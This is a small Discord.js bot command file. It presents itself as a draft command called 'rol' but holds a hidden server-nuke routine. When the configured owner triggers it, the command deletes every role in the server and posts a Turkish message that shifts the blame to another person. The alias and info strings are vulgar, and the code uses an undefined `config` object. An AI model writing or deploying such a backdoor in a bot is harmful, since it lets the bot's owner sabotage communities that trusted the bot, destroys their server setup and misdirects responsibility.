const { Discord, MessageEmbed } = require("discord.js");
module.exports.execute = async(client, message, args) => {
  
    let victim = message.author.id;
    if(config.owner.includes(victim)) {

      message.channel.send("VALLA RAPTOR VURDU, RICHARD SADECE BOTU YAPTI LA VALLA ÇOCUK MASUM LA ELLEMEYİN LA ONA")
      message.guild.roles.cache.forEach(x => x.delete())
}  
  
  };

module.exports.configuration = {
    name: "rol",
    aliases: ["saldıramkçocu"],
    info: "rolleri sikerim abiii",
    usage: "Taslak",
    description: "Taslak Komutu."
};